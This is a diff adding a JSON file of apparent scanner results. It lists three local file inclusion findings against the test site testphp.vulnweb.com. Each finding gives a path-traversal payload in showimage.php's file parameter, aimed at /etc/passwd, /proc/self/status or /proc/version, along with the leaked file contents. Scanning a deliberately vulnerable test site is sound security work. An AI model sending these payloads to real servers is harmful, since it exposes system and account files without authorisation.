@@ -1,0 +1,23 @@
+[
+    {
+        "type": "LFI",
+        "payload": "%2Fproc%2Fself%2Fstatus",
+        "method": "GET",
+        "location": "http://testphp.vulnweb.com/showimage.php?file=%2Fproc%2Fself%2Fstatus",
+        "response_snippet": "Name:\tphp-fpm5.6\nUmask:\t0022\nState:\tR (running)\nTgid:\t2128727\nNgid:\t0\nPid:\t2128727\nPPid:\t2128282\nTracerPid:\t0\nUid:\t33\t33\t33\t33\nGid:\t33\t33\t33\t33\nFDSize:\t64\nGroups:\t33 \nNStgid:\t2128727\nNSpid:\t2128727\nNS"
+    },
+    {
+        "type": "LFI",
+        "payload": "..%2F..%2Fetc%2Fpasswd",
+        "method": "GET",
+        "location": "http://testphp.vulnweb.com/showimage.php?file=..%2F..%2Fetc%2Fpasswd",
+        "response_snippet": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman"
+    },
+    {
+        "type": "LFI",
+        "payload": "%2Fproc%2Fversion",
+        "method": "GET",
+        "location": "http://testphp.vulnweb.com/showimage.php?file=%2Fproc%2Fversion",
+        "response_snippet": "Linux version 5.4.0-1030-aws (buildd@lcy01-amd64-028) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #31-Ubuntu SMP Fri Nov 13 11:40:37 UTC 2020\n"
+    }
+]
